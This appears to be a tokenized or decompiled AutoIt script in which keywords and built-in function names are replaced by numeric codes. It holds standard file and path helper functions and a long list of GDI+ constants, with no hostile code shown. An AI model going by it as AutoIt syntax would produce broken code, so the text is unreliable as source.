13$I=015$IDIM_1-$IFLAGS-1
$ATEMP_ARRAY[$I+$IFLAGS]=331($ALINES[$I],$SDELIMITER,$IENTIRE+$INOCOUNT)
14
4$IFLAGS5
$ATEMP_ARRAY[0]=$IDIM_1-$IFLAGS
8
8
$VRETURN=$ATEMP_ARRAY
6
4$IFLAGS5
28$HFILEOPEN=110($SFILEPATH,$FO_READ)
4$HFILEOPEN=-1534287(1,0,0)
28$SFILEREAD=112($HFILEOPEN)
90($HFILEOPEN)
4323($SFILEREAD)5
$VRETURN=326(@LF&$SFILEREAD,"(?|(\N+)\z|(\N*)(?:\R))",$STR_REGEXPARRAYGLOBALMATCH)
$VRETURN[0]=369($VRETURN)-1
6
34287(2,0,0)
8
6
$VRETURN=114($SFILEPATH)
4@ERROR5
$VRETURN=0
34287(@ERROR,0,0)
8
8
8
341
33
32_FILEWRITEFROMARRAY($SFILEPATH,3036$AARRAY,$IBASE=41,$IUBOUND=41,$SDELIMITER="|")
28$IRETURN=0
43219($AARRAY)534287(2,0,$IRETURN)
28$IDIMS=369($AARRAY,$UBOUND_DIMENSIONS)
4$IDIMS>2534287(4,0,0)
28$ILAST=369($AARRAY)-1
4$IUBOUND=412$IUBOUND>$ILAST5$IUBOUND=$ILAST
4$IBASE<02$IBASE=415$IBASE=0
4$IBASE>$IUBOUND534287(5,0,$IRETURN)
4$SDELIMITER=415$SDELIMITER="|"
28$HFILEOPEN=$SFILEPATH
4233($SFILEPATH)5
$HFILEOPEN=110($SFILEPATH,$FO_OVERWRITE)
4$HFILEOPEN=-1534287(1,0,$IRETURN)
8
28$IERROR=0
$IRETURN=1
23$IDIMS
211
13$I=$IBASE15$IUBOUND
43123($HFILEOPEN,$AARRAY[$I]&@CRLF)5
$IERROR=3
$IRETURN=0
18
8
14
212
28$STEMP=""
13$I=$IBASE15$IUBOUND
$STEMP=$AARRAY[$I][0]
13$J=115369($AARRAY,$UBOUND_COLUMNS)-1
$STEMP&=$SDELIMITER&$AARRAY[$I][$J]
14
43123($HFILEOPEN,$STEMP&@CRLF)5
$IERROR=3
$IRETURN=0
18
8
14
24
4233($SFILEPATH)590($HFILEOPEN)
34287($IERROR,0,$IRETURN)
33
32_FILEWRITELOG($SLOGPATH,$SLOGMSG,$IFLAG=-1)
28$IOPENMODE=$FO_APPEND
28$SMSG=@YEAR&"-"&@MON&"-"&@MDAY&" "&@HOUR&":"&@MIN&":"&@SEC&" : "&$SLOGMSG
4$IFLAG=415$IFLAG=-1
4$IFLAG<>-15
$IOPENMODE=$FO_OVERWRITE
$SMSG&=@CRLF&112($SLOGPATH)
8
28$HFILEOPEN=$SLOGPATH
4233($SLOGPATH)5$HFILEOPEN=110($SLOGPATH,$IOPENMODE)
4$HFILEOPEN=-1534287(1,0,0)
28$IRETURN=124($HFILEOPEN,$SMSG)
4233($SLOGPATH)5$IRETURN=90($HFILEOPEN)
4$IRETURN<=0534287(2,$IRETURN,0)
34$IRETURN
33
32_FILEWRITETOLINE($SFILEPATH,$ILINE,$STEXT,$BOVERWRITE=40,$BFILL=40)
4$BOVERWRITE=415$BOVERWRITE=40
4$BFILL=415$BFILL=40
4395($SFILEPATH)534287(2,0,0)
4$ILINE<=0534287(4,0,0)
43(221($BOVERWRITE)2$BOVERWRITE=02$BOVERWRITE=1)534287(5,0,0)
43233($STEXT)5
$STEXT=306($STEXT)
4$STEXT=""534287(6,0,0)
8
43221($BFILL)534287(7,0,0)
28$AARRAY=114($SFILEPATH)
4@ERROR528$AARRAY[0]
28$IUBOUND=369($AARRAY)-1
4$BFILL5
4$IUBOUND<$ILINE5
27$AARRAY[$ILINE]
$IUBOUND=$ILINE-1
8
6
4($IUBOUND+1)<$ILINE534287(1,0,0)
8
$AARRAY[$ILINE-1]=($BOVERWRITE$STEXT$STEXT&@CRLF&$AARRAY[$ILINE-1])
28$SDATA=""
13$I=015$IUBOUND
$SDATA&=$AARRAY[$I]&@CRLF
14
$SDATA=337($SDATA,323(@CRLF))
28$HFILEOPEN=110($SFILEPATH,100($SFILEPATH)+$FO_OVERWRITE)
4$HFILEOPEN=-1534287(3,0,0)
123($HFILEOPEN,$SDATA)
90($HFILEOPEN)
341
33
32_PATHFULL($SRELATIVEPATH,$SBASEPATH=@WORKINGDIR)
43$SRELATIVEPATH2$SRELATIVEPATH="."534$SBASEPATH
28$SFULLPATH=328($SRELATIVEPATH,"/","\")
2830$SFULLPATHCONST=$SFULLPATH
28$SPATH
28$BROOTONLY=322($SFULLPATH,1)="\"1325($SFULLPATH,2,1)<>"\"
4$SBASEPATH=415$SBASEPATH=@WORKINGDIR
13$I=1152
$SPATH=322($SFULLPATH,2)
4$SPATH="\\"5
$SFULLPATH=336($SFULLPATH,2)
28$NSERVERLEN=311($SFULLPATH,"\")-1
$SPATH="\\"&322($SFULLPATH,$NSERVERLEN)
$SFULLPATH=336($SFULLPATH,$NSERVERLEN)
18
7330($SPATH,1)=":"5
$SFULLPATH=336($SFULLPATH,2)
18
6
$SFULLPATH=$SBASEPATH&"\"&$SFULLPATH
8
14
4322($SFULLPATH,1)<>"\"5
4322($SFULLPATHCONST,2)=322($SBASEPATH,2)5
$SFULLPATH=$SBASEPATH&"\"&$SFULLPATH
6
$SFULLPATH="\"&$SFULLPATH
8
8
28$ATEMP=331($SFULLPATH,"\")
28$APATHPARTS[$ATEMP[0]],$J=0
13$I=215$ATEMP[0]
4$ATEMP[$I]=".."5
4$J5$J-=1
73($ATEMP[$I]=""1$I<>$ATEMP[0])1$ATEMP[$I]<>"."5
$APATHPARTS[$J]=$ATEMP[$I]
$J+=1
8
14
$SFULLPATH=$SPATH
43$BROOTONLY5
13$I=015$J-1
$SFULLPATH&="\"&$APATHPARTS[$I]
14
6
$SFULLPATH&=$SFULLPATHCONST
4311($SFULLPATH,"..")5$SFULLPATH=_PATHFULL($SFULLPATH)
8
11
$SFULLPATH=328($SFULLPATH,".\","\")
12@EXTENDED=0
34$SFULLPATH
33
32_PATHGETRELATIVE($SFROM,$STO)
4330($SFROM,1)<>"\"5$SFROM&="\"
4330($STO,1)<>"\"5$STO&="\"
4$SFROM=$STO534287(1,0,337($STO,1))
28$ASFROM=331($SFROM,"\")
28$ASTO=331($STO,"\")
4$ASFROM[1]<>$ASTO[1]534287(2,0,337($STO,1))
28$I=2
28$IDIFF=1
91
4$ASFROM[$I]<>$ASTO[$I]5
$IDIFF=$I
18
8
$I+=1
10
$I=1
28$SRELPATH=""
13$J=115$ASTO[0]
4$I>=$IDIFF5
$SRELPATH&="\"&$ASTO[$I]
8
$I+=1
14
$SRELPATH=336($SRELPATH,1)
$I=1
13$J=115$ASFROM[0]
4$I>$IDIFF5
$SRELPATH="..\"&$SRELPATH
8
$I+=1
14
4330($SRELPATH,1)=="\"5$SRELPATH=337($SRELPATH,1)
34$SRELPATH
33
32_PATHMAKE($SDRIVE,$SDIR,$SFILENAME,$SEXTENSION)
4323($SDRIVE)5
43(322($SDRIVE,2)="\\")5$SDRIVE=322($SDRIVE,1)&":"
8
4323($SDIR)5
43(330($SDIR,1)="\")13(330($SDIR,1)="/")5$SDIR=$SDIR&"\"
6
$SDIR="\"
8
4323($SDIR)5
43(322($SDIR,1)="\")13(322($SDIR,1)="/")5$SDIR="\"&$SDIR
8
4323($SEXTENSION)5
43(322($SEXTENSION,1)=".")5$SEXTENSION="."&$SEXTENSION
8
34$SDRIVE&$SDIR&$SFILENAME&$SEXTENSION
33
32_PATHSPLIT($SFILEPATH,36$SDRIVE,36$SDIR,36$SFILENAME,36$SEXTENSION)
28$AARRAY=326($SFILEPATH,"^\h*((?:\\\\\?\\)*(\\\\[^\?\/\\]+|[A-Za-z]:)?(.*[\/\\]\h*)?((?:[^\.\/\\]|(?(?=\.[^\/\\]*\.)\.))*)?([^\/\\]*))$",$STR_REGEXPARRAYMATCH)
4@ERROR5
27$AARRAY[5]
$AARRAY[$PATH_ORIGINAL]=$SFILEPATH
8
$SDRIVE=$AARRAY[$PATH_DRIVE]
4322($AARRAY[$PATH_DIRECTORY],1)=="/"5
$SDIR=327($AARRAY[$PATH_DIRECTORY],"\h*[\/\\]+\h*","\/")
6
$SDIR=327($AARRAY[$PATH_DIRECTORY],"\h*[\/\\]+\h*","\\")
8
$AARRAY[$PATH_DIRECTORY]=$SDIR
$SFILENAME=$AARRAY[$PATH_FILENAME]
$SEXTENSION=$AARRAY[$PATH_EXTENSION]
34$AARRAY
33
32_REPLACESTRINGINFILE($SFILEPATH,$SSEARCHSTRING,$SREPLACESTRING,$ICASESENSITIVE=0,$IOCCURANCE=1)
4311(99($SFILEPATH),"R")534287(1,0,-1)
28$HFILEOPEN=110($SFILEPATH,$FO_READ)
4$HFILEOPEN=-1534287(2,0,-1)
28$SFILEREAD=112($HFILEOPEN)
90($HFILEOPEN)
4$ICASESENSITIVE=415$ICASESENSITIVE=0
4$IOCCURANCE=415$IOCCURANCE=1
$SFILEREAD=328($SFILEREAD,$SSEARCHSTRING,$SREPLACESTRING,1-$IOCCURANCE,$ICASESENSITIVE)
28$IRETURN=@EXTENDED
4$IRETURN5
28$IFILEENCODING=100($SFILEPATH)
$HFILEOPEN=110($SFILEPATH,$IFILEENCODING+$FO_OVERWRITE)
4$HFILEOPEN=-1534287(3,0,-1)
123($HFILEOPEN,$SFILEREAD)
90($HFILEOPEN)
8
34$IRETURN
33
32_TEMPFILE($SDIRECTORYNAME=@TEMPDIR,$SFILEPREFIX="~",$SFILEEXTENSION=".tmp",$IRANDOMLENGTH=7)
4$IRANDOMLENGTH=412$IRANDOMLENGTH<=05$IRANDOMLENGTH=7
4$SDIRECTORYNAME=412(395($SDIRECTORYNAME))5$SDIRECTORYNAME=@TEMPDIR
4$SFILEEXTENSION=415$SFILEEXTENSION=".tmp"
4$SFILEPREFIX=415$SFILEPREFIX="~"
4395($SDIRECTORYNAME)5$SDIRECTORYNAME=@SCRIPTDIR
$SDIRECTORYNAME=327($SDIRECTORYNAME,"[\\/]+$","")
$SFILEEXTENSION=327($SFILEEXTENSION,"^\.+","")
$SFILEPREFIX=327($SFILEPREFIX,'[\\/:*?"<>|]',"")
28$STEMPNAME=""
11
$STEMPNAME=""
9323($STEMPNAME)<$IRANDOMLENGTH
$STEMPNAME&=28(274(97,122,1))
10
$STEMPNAME=$SDIRECTORYNAME&"\"&$SFILEPREFIX&$STEMPNAME&"."&$SFILEEXTENSION
12395($STEMPNAME)
34$STEMPNAME
33
2930$GDIP_DASHCAPFLAT=0
2930$GDIP_DASHCAPROUND=2
2930$GDIP_DASHCAPTRIANGLE=3
2930$GDIP_DASHSTYLESOLID=0
2930$GDIP_DASHSTYLEDASH=1
2930$GDIP_DASHSTYLEDOT=2
2930$GDIP_DASHSTYLEDASHDOT=3
2930$GDIP_DASHSTYLEDASHDOTDOT=4
2930$GDIP_DASHSTYLECUSTOM=5
2930$GDIP_EPGCHROMINANCETABLE="{F2E455DC-09B3-4316-8260-676ADA32481C}"
2930$GDIP_EPGCOLORDEPTH="{66087055-AD66-4C7C-9A18-38A2310B8337}"
2930$GDIP_EPGCOMPRESSION="{E09D739D-CCD4-44EE-8EBA-3FBF8BE4FC58}"
2930$GDIP_EPGLUMINANCETABLE="{EDB33BCE-0266-4A77-B904-27216099E717}"
2930$GDIP_EPGQUALITY="{1D5BE4B5-FA4A-452D-9CDD-5DB35105E7EB}"
2930$GDIP_EPGRENDERMETHOD="{6D42C53A-229A-4825-8BB7-5C99E2B9A8B8}"
2930$GDIP_EPGSAVEFLAG="{292266FC-AC40-47BF-8CFC-A85B89A655DE}"
2930$GDIP_EPGSCANMETHOD="{3A4E2661-3109-4E56-8536-42C156E7DCFA}"
2930$GDIP_EPGTRANSFORMATION="{8D0EB2D1-A58E-4EA8-AA14-108074B7B6F9}"
2930$GDIP_EPGVERSION="{24D18C76-814A-41A4-BF53-1C219CCCF797}"
2930$GDIP_EPTBYTE=1
2930$GDIP_EPTASCII=2
2930$GDIP_EPTSHORT=3
2930$GDIP_EPTLONG=4
2930$GDIP_EPTRATIONAL=5
2930$GDIP_EPTLONGRANGE=6
2930$GDIP_EPTUNDEFINED=7
2930$GDIP_EPTRATIONALRANGE=8
2930$GDIP_ERROK=0
2930$GDIP_ERRGENERICERROR=1
2930$GDIP_ERRINVALIDPARAMETER=2
2930$GDIP_ERROUTOFMEMORY=3
2930$GDIP_ERROBJECTBUSY=4
2930$GDIP_ERRINSUFFICIENTBUFFER=5
2930$GDIP_ERRNOTIMPLEMENTED=6
2930$GDIP_ERRWIN32ERROR=7
2930$GDIP_ERRWRONGSTATE=8
2930$GDIP_ERRABORTED=9
2930$GDIP_ERRFILENOTFOUND=10
2930$GDIP_ERRVALUEOVERFLOW=11
2930$GDIP_ERRACCESSDENIED=12
2930$GDIP_ERRUNKNOWNIMAGEFORMAT=13
2930$GDIP_ERRFONTFAMILYNOTFOUND=14
2930$GDIP_ERRFONTSTYLENOTFOUND=15
2930$GDIP_ERRNOTTRUETYPEFONT=16
2930$GDIP_ERRUNSUPPORTEDGDIVERSION=17
2930$GDIP_ERRGDIPLUSNOTINITIALIZED=18
2930$GDIP_ERRPROPERTYNOTFOUND=19
2930$GDIP_ERRPROPERTYNOTSUPPORTED=20
2930$GDIP_EVTCOMPRESSIONLZW=2
2930$GDIP_EVTCOMPRESSIONCCITT3=3
2930$GDIP_EVTCOMPRESSIONCCITT4=4
2930$GDIP_EVTCOMPRESSIONRLE=5
2930$GDIP_EVTCOMPRESSIONNONE=6
2930$GDIP_EVTTRANSFORMROTATE90=13
2930$GDIP_EVTTRANSFORMROTATE180=14
2930$GDIP_EVTTRANSFORMROTATE270=15
2930$GDIP_EVTTRANSFORMFLIPHORIZONTAL=16
2930$GDIP_EVTTRANSFORMFLIPVERTICAL=17
2930$GDIP_EVTMULTIFRAME=18
2930$GDIP_EVTLASTFRAME=19
2930$GDIP_EVTFLUSH=20
2930$GDIP_EVTFRAMEDIMENSIONPAGE=23
2930$GDIP_ICFENCODER=1
2930$GDIP_ICFDECODER=2
2930$GDIP_ICFSUPPORTBITMAP=4
2930$GDIP_ICFSUPPORTVECTOR=8
2930$GDIP_ICFSEEKABLEENCODE=16
2930$GDIP_ICFBLOCKINGDECODE=32
2930$GDIP_ICFBUILTIN=65536
2930$GDIP_ICFSYSTEM=131072
2930$GDIP_ICFUSER=262144
2930$GDIP_ILMREAD=1
2930$GDIP_ILMWRITE=2
2930$GDIP_ILMUSERINPUTBUF=4
2930$GDIP_LINECAPFLAT=0
2930$GDIP_LINECAPSQUARE=1
2930$GDIP_LINECAPROUND=2
2930$GDIP_LINECAPTRIANGLE=3
2930$GDIP_LINECAPNOANCHOR=16
2930$GDIP_LINECAPSQUAREANCHOR=17
2930$GDIP_LINECAPROUNDANCHOR=18
2930$GDIP_LINECAPDIAMONDANCHOR=19
2930$GDIP_LINECAPARROWANCHOR=20
2930$GDIP_LINECAPCUSTOM=255
2930$GDIP_PXF01INDEXED=196865
2930$GDIP_PXF04INDEXED=197634
2930$GDIP_PXF08INDEXED=198659
2930$GDIP_PXF16GRAYSCALE=1052676
2930$GDIP_PXF16RGB555=135173
2930$GDIP_PXF16RGB565=135174
2930$GDIP_PXF16ARGB1555=397319
2930$GDIP_PXF24RGB=137224
2930$GDIP_PXF32RGB=139273
2930$GDIP_PXF32ARGB=2498570
2930$GDIP_PXF32PARGB=925707
2930$GDIP_PXF48RGB=1060876
2930$GDIP_PXF64ARGB=3424269
2930$GDIP_PXF64PARGB=1720334
2930$GDIP_IMAGEFORMAT_UNDEFINED="{B96B3CA9-0728-11D3-9D7B-0000F81EF32E}"
2930$GDIP_IMAGEFORMAT_MEMORYBMP="{B96B3CAA-0728-11D3-9D7B-0000F81EF32E}"
2930$GDIP_IMAGEFORMAT_BMP="{B96B3CAB-0728-11D3-9D7B-0000F81EF32E}"
2930$GDIP_IMAGEFORMAT_EMF="{B96B3CAC-0728-11D3-9D7B-0000F81EF32E}"
2930$GDIP_IMAGEFORMAT_WMF="{B96B3CAD-0728-11D3-9D7B-0000F81EF32E}"
2930$GDIP_IMAGEFORMAT_JPEG="{B96B3CAE-0728-11D3-9D7B-0000F81EF32E}"
2930$GDIP_IMAGEFORMAT_PNG="{B96B3CAF-0728-11D3-9D7B-0000F81EF32E}"
2930$GDIP_IMAGEFORMAT_GIF="{B96B3CB0-0728-11D3-9D7B-0000F81EF32E}"
2930$GDIP_IMAGEFORMAT_TIFF="{B96B3CB1-0728-11D3-9D7B-0000F81EF32E}"
2930$GDIP_IMAGEFORMAT_EXIF="{B96B3CB2-0728-11D3-9D7B-0000F81EF32E}"
2930$GDIP_IMAGEFORMAT_ICON="{B96B3CB5-0728-11D3-9D7B-0000F81EF32E}"
2930$GDIP_IMAGETYPE_UNKNOWN=0
2930$GDIP_IMAGETYPE_BITMAP=1
2930$GDIP_IMAGETYPE_METAFILE=2
2930$GDIP_IMAGEFLAGS_NONE=0
2930$GDIP_IMAGEFLAGS_SCALABLE=1
2930$GDIP_IMAGEFLAGS_HASALPHA=2
2930$GDIP_IMAGEFLAGS_HASTRANSLUCENT=4
2930$GDIP_IMAGEFLAGS_PARTIALLYSCALABLE=8
2930$GDIP_IMAGEFLAGS_COLORSPACE_RGB=16
2930$GDIP_IMAGEFLAGS_COLORSPACE_CMYK=32
2930$GDIP_IMAGEFLAGS_COLORSPACE_GRAY=64
2930$GDIP_IMAGEFLAGS_COLORSPACE_YCBCR=128
2930$GDIP_IMAGEFLAGS_COLORSPACE_YCCK=256
2930$GDIP_IMAGEFLAGS_HASREALDPI=4096
2930$GDIP_IMAGEFLAGS_HASREALPIXELSIZE=8192
2930$GDIP_IMAGEFLAGS_READONLY=65536
2930$GDIP_IMAGEFLAGS_CACHING=131072
2930$GDIP_SMOOTHINGMODE_INVALID=-1
2930$GDIP_SMOOTHINGMODE_DEFAULT=0
2930$GDIP_SMOOTHINGMODE_HIGHSPEED=1
2930$GDIP_SMOOTHINGMODE_HIGHQUALITY=2
2930$GDIP_SMOOTHINGMODE_NONE=3
2930$GDIP_SMOOTHINGMODE_ANTIALIAS8X4=4
2930$GDIP_SMOOTHINGMODE_ANTIALIAS=$GDIP_SMOOTHINGMODE_ANTIALIAS8X4
2930$GDIP_SMOOTHINGMODE_ANTIALIAS8X8=5
2930$GDIP_RLUM=0.3086
2930$GDIP_GLUM=0.6094
2930$GDIP_BLUM=0.082
2930$GDIP_INTERPOLATIONMODE_INVALID=-1
2930$GDIP_INTERPOLATIONMODE_DEFAULT=0
2930$GDIP_INTERPOLATIONMODE_LOWQUALITY=1
2930$GDIP_INTERPOLATIONMODE_HIGHQUALITY=2
2930$GDIP_INTERPOLATIONMODE_BILINEAR=3
2930$GDIP_INTERPOLATIONMODE_BICUBIC=4
2930$GDIP_INTERPOLATIONMODE_NEARESTNEIGHBOR=5
2930$GDIP_INTERPOLATIONMODE_HIGHQUALITYBILINEAR=6
2930$GDIP_INTERPOLATIONMODE_HIGHQUALITYBICUBIC=7
2930$GDIP_TEXTRENDERINGHINT_SYSTEMDEFAULT=0
2930$GDIP_TEXTRENDERINGHINT_SINGLEBITPERPIXELGRIDFIT=1
2930$GDIP_TEXTRENDERINGHINT_SINGLEBITPERPIXEL=2
2930$GDIP_TEXTRENDERINGHINT_ANTIALIASGRIDFIT=3
2930$GDIP_TEXTRENDERINGHINT_ANTIALIAS=4
2930$GDIP_TEXTRENDERINGHINT_CLEARTYPEGRIDFIT=5
2930$GDIP_PIXELOFFSETMODE_INVALID=-1
2930$GDIP_PIXELOFFSETMODE_DEFAULT=0
2930$GDIP_PIXELOFFSETMODE_HIGHSPEED=1
2930$GDIP_PIXELOFFSETMODE_HIGHQUALITY=2
2930$GDIP_PIXELOFFSETMODE_NONE=3
2930$GDIP_PIXELOFFSETMODE_HALF=4
2930$GDIP_PENSETLINEJOIN_MITER=0
2930$GDIP_PENSETLINEJOIN_BEVEL=1
2930$GDIP_PENSETLINEJOIN_ROUND=2
2930$GDIP_PENSETLINEJOIN_MITERCLIPPED=3
2930$GDIP_FILLMODEALTERNATE=0
2930$GDIP_FILLMODEWINDING=1
2930$GDIP_QUALITYMODEINVALID=-1
2930$GDIP_QUALITYMODEDEFAULT=0
2930$GDIP_QUALITYMODELOW=1
2930$GDIP_QUALITYMODEHIGH=2
2930$GDIP_COMPOSITINGMODESOURCEOVER=0
2930$GDIP_COMPOSITINGMODESOURCECOPY=1
2930$GDIP_COMPOSITINGQUALITYINVALID=$GDIP_QUALITYMODEINVALID
2930$GDIP_COMPOSITINGQUALITYDEFAULT=$GDIP_QUALITYMODEDEFAULT
2930$GDIP_COMPOSITINGQUALITYHIGHSPEED=$GDIP_QUALITYMODELOW
2930$GDIP_COMPOSITINGQUALITYHIGHQUALITY=$GDIP_QUALITYMODEHIGH
2930$GDIP_COMPOSITINGQUALITYGAMMACORRECTED=3
2930$GDIP_COMPOSITINGQUALITYASSUMELINEAR=4
2930$GDIP_HATCHSTYLE_HORIZONTAL=0
2930$GDIP_HATCHSTYLE_VERTICAL=1
2930$GDIP_HATCHSTYLE_FORWARDDIAGONAL=2
2930$GDIP_HATCHSTYLE_BACKWARDDIAGONAL=3
2930$GDIP_HATCHSTYLE_CROSS=4
2930$GDIP_HATCHSTYLE_DIAGONALCROSS=5
2930$GDIP_HATCHSTYLE_05PERCENT=6
2930$GDIP_HATCHSTYLE_10PERCENT=7
2930$GDIP_HATCHSTYLE_20PERCENT=8
2930$GDIP_HATCHSTYLE_25PERCENT=9
2930$GDIP_HATCHSTYLE_30PERCENT=10
2930$GDIP_HATCHSTYLE_40PERCENT=11
2930$GDIP_HATCHSTYLE_50PERCENT=12
2930$GDIP_HATCHSTYLE_60PERCENT=13
2930$GDIP_HATCHSTYLE_70PERCENT=14
2930$GDIP_HATCHSTYLE_75PERCENT=15
2930$GDIP_HATCHSTYLE_80PERCENT=16
2930$GDIP_HATCHSTYLE_90PERCENT=17
2930$GDIP_HATCHSTYLE_LIGHTDOWNWARDDIAGONAL=18
2930$GDIP_HATCHSTYLE_LIGHTUPWARDDIAGONAL=19
2930$GDIP_HATCHSTYLE_DARKDOWNWARDDIAGONAL=20
2930$GDIP_HATCHSTYLE_DARKUPWARDDIAGONAL=21
2930$GDIP_HATCHSTYLE_WIDEDOWNWARDDIAGONAL=22
2930$GDIP_HATCHSTYLE_WIDEUPWARDDIAGONAL=23
2930$GDIP_HATCHSTYLE_LIGHTVERTICAL=24
2930$GDIP_HATCHSTYLE_LIGHTHORIZONTAL=25
2930$GDIP_HATCHSTYLE_NARROWVERTICAL=26
2930$GDIP_HATCHSTYLE_NARROWHORIZONTAL=27
2930$GDIP_HATCHSTYLE_DARKVERTICAL=28
2930$GDIP_HATCHSTYLE_DARKHORIZONTAL=29
2930$GDIP_HATCHSTYLE_DASHEDDOWNWARDDIAGONAL=30
2930$GDIP_HATCHSTYLE_DASHEDUPWARDDIAGONAL=31
2930$GDIP_HATCHSTYLE_DASHEDHORIZONTAL=32
2930$GDIP_HATCHSTYLE_DASHEDVERTICAL=33
2930$GDIP_HATCHSTYLE_SMALLCONFETTI=34
2930$GDIP_HATCHSTYLE_LARGECONFETTI=35
2930$GDIP_HATCHSTYLE_ZIGZAG=36
2930$GDIP_HATCHSTYLE_WAVE=37
2930$GDIP_HATCHSTYLE_DIAGONALBRICK=38
2930$GDIP_HATCHSTYLE_HORIZONTALBRICK=39
2930$GDIP_HATCHSTYLE_WEAVE=40
2930$GDIP_HATCHSTYLE_PLAID=41
2930$GDIP_HATCHSTYLE_DIVOT=42
2930$GDIP_HATCHSTYLE_DOTTEDGRID=43
2930$GDIP_HATCHSTYLE_DOTTEDDIAMOND=44
2930$GDIP_HATCHSTYLE_SHINGLE=45
2930$GDIP_HATCHSTYLE_TRELLIS=46
2930$GDIP_HATCHSTYLE_SPHERE=47
2930$GDIP_HATCHSTYLE_SMALLGRID=48
2930$GDIP_HATCHSTYLE_SMALLCHECKERBOARD=49
2930$GDIP_HATCHSTYLE_LARGECHECKERBOARD=50
2930$GDIP_HATCHSTYLE_OUTLINEDDIAMOND=51
2930$GDIP_HATCHSTYLE_SOLIDDIAMOND=52
2930$GDIP_HATCHSTYLE_TOTAL=53
2930$GDIP_HATCHSTYLE_LARGEGRID=$GDIP_HATCHSTYLE_CROSS
2930$GDIP_HATCHSTYLE_MIN=$GDIP_HATCHSTYLE_HORIZONTAL
2930$GDIP_HATCHSTYLE_MAX=$GDIP_HATCHSTYLE_TOTAL-1
2930$GDIP_BLUREFFECTGUID="{633C80A4-1843-482b-9EF2-BE2834C5FDD4}"
2930$GDIP_SHARPENEFFECTGUID="{63CBF3EE-C526-402c-8F71-62C540BF5142}"
2930$GDIP_COLORMATRIXEFFECTGUID="{718F2615-7933-40e3-A511-5F68FE14DD74}"
2930$GDIP_COLORLUTEFFECTGUID="{A7CE72A9-0F7F-40d7-B3CC-D0C02D5C3212}"
2930$GDIP_BRIGHTNESSCONTRASTEFFECTGUID="{D3A1DBE1-8EC4-4c17-9F4C-EA97AD1C343D}"
2930$GDIP_HUESATURATIONLIGHTNESSEFFECTGUID="{8B2DD6C3-EB07-4d87-A5F0-7108E26A9C5F}"
2930$GDIP_LEVELSEFFECTGUID="{99C354EC-2A31-4f3a-8C34-17A803B33A25}"
2930$GDIP_TINTEFFECTGUID="{1077AF00-2848-4441-9489-44AD4C2D7A2C}"
2930$GDIP_COLORBALANCEEFFECTGUID="{537E597D-251E-48da-9664-29CA496B70F8}"
2930$GDIP_REDEYECORRECTIONEFFECTGUID="{74D29D05-69A4-4266-9549-3CC52836B632}"
2930$GDIP_COLORCURVEEFFECTGUID="{DD6A0022-58E4-4a67-9D9B-D48EB881A53D}"
2930$GDIP_ADJUSTEXPOSURE=0
2930$GDIP_ADJUSTDENSITY=1
2930$GDIP_ADJUSTCONTRAST=2
2930$GDIP_ADJUSTHIGHLIGHT=3
2930$GDIP_ADJUSTSHADOW=4
2930$GDIP_ADJUSTMIDTONE=5
2930$GDIP_ADJUSTWHITESATURATION=6
2930$GDIP_ADJUSTBLACKSATURATION=7
2930$GDIP_CURVECHANNELALL=0
2930$GDIP_CURVECHANNELRED=1
2930$GDIP_CURVECHANNELGREEN=2
2930$GDIP_CURVECHANNELBLUE=3
2930$GDIP_PALETTETYPECUSTOM=0
2930$GDIP_PALETTETYPEOPTIMAL=1
2930$GDIP_PALETTETYPEFIXEDBW=2
2930$GDIP_PALETTETYPEFIXEDHALFTONE8=3
2930$GDIP_PALETTETYPEFIXEDHALFTONE27=4
2930$GDIP_PALETTETYPEFIXEDHALFTONE64=5
2930$GDIP_PALETTETYPEFIXEDHALFTONE125=6
2930$GDIP_PALETTETYPEFIXEDHALFTONE216=7
2930$GDIP_PALETTETYPEFIXEDHALFTONE252=8
2930$GDIP_PALETTETYPEFIXEDHALFTONE256=9
2930$GDIP_PALETTEFLAGSHASALPHA=1
2930$GDIP_PALETTEFLAGSGRAYSCALE=2
2930$GDIP_PALETTEFLAGSHALFTONE=4
2930$GDIP_DITHERTYPENONE=0
2930$GDIP_DITHERTYPESOLID=1
2930$GDIP_DITHERTYPEORDERED4X4=2
2930$GDIP_DITHERTYPEORDERED8X8=3
2930$GDIP_DITHERTYPEORDERED16X16=4
2930$GDIP_DITHERTYPEORDERED91X91=5
2930$GDIP_DITHERTYPESPIRAL4X4=6
2930$GDIP_DITHERTYPESPIRAL8X8=7
2930$GDIP_DITHERTYPEDUALSPIRAL4X4=8
2930$GDIP_DITHERTYPEDUALSPIRAL8X8=9
2930$GDIP_DITHERTYPEERRORDIFFUSION=10
2930$GDIP_DITHERTYPEMAX=10
2930$GDIP_HISTOGRAMFORMATARGB=0
2930$GDIP_HISTOGRAMFORMATPARGB=1
2930$GDIP_HISTOGRAMFORMATRGB=2
2930$GDIP_HISTOGRAMFORMATGRAY=3
2930$GDIP_HISTOGRAMFORMATB=4
2930$GDIP_HISTOGRAMFORMATG=5
2930$GDIP_HISTOGRAMFORMATR=6
2930$GDIP_HISTOGRAMFORMATA=7
2930$GDIP_TEXTRENDERINGHINTSYSTEMDEFAULT=0
2930$GDIP_TEXTRENDERINGHINTSINGLEBITPERPIXELGRIDFIT=1
2930$GDIP_TEXTRENDERINGHINTSINGLEBITPERPIXEL=2
2930$GDIP_TEXTRENDERINGHINTANTIALIASGRIDFIT=3
2930$GDIP_TEXTRENDERINGHINTANTIALIAS=4
2930$GDIP_TEXTRENDERINGHINTCLEARTYPEGRIDFIT=5
2930$GDIP_ROTATENONEFLIPNONE=0
2930$GDIP_ROTATE90FLIPNONE=1
2930$GDIP_ROTATE180FLIPNONE=2
2930$GDIP_ROTATE270FLIPNONE=3
2930$GDIP_ROTATENONEFLIPX=4
2930$GDIP_ROTATE90FLIPX=5
2930$GDIP_ROTATE180FLIPX=6
2930$GDIP_ROTATE270FLIPX=7
2930$GDIP_ROTATENONEFLIPY=$GDIP_ROTATE180FLIPX
2930$GDIP_ROTATE90FLIPY=$GDIP_ROTATE270FLIPX
2930$GDIP_ROTATE180FLIPY=$GDIP_ROTATENONEFLIPX
2930$GDIP_ROTATE270FLIPY=$GDIP_ROTATE90FLIPX
2930$GDIP_ROTATENONEFLIPXY=$GDIP_ROTATE180FLIPNONE
2930$GDIP_ROTATE90FLIPXY=$GDIP_ROTATE270FLIPNONE
2930$GDIP_ROTATE270FLIPXY=$GDIP_ROTATE90FLIPNONE
2930$GDIP_FRAMEDIMENSION_TIME="{6AEDBD6D-3FB5-418A-83A6-7F45229DC872}"
2930$GDIP_FRAMEDIMENSION_RESOLUTION="{84236F7B-3BD3-428F-8DAB-4EA1439CA315}"
2930$GDIP_FRAMEDIMENSION_PAGE="{7462DC86-6180-4C7E-8E3F-EE7333A7A483}"
2930$GDIP_COLORADJUSTTYPE_DEFAULT=0
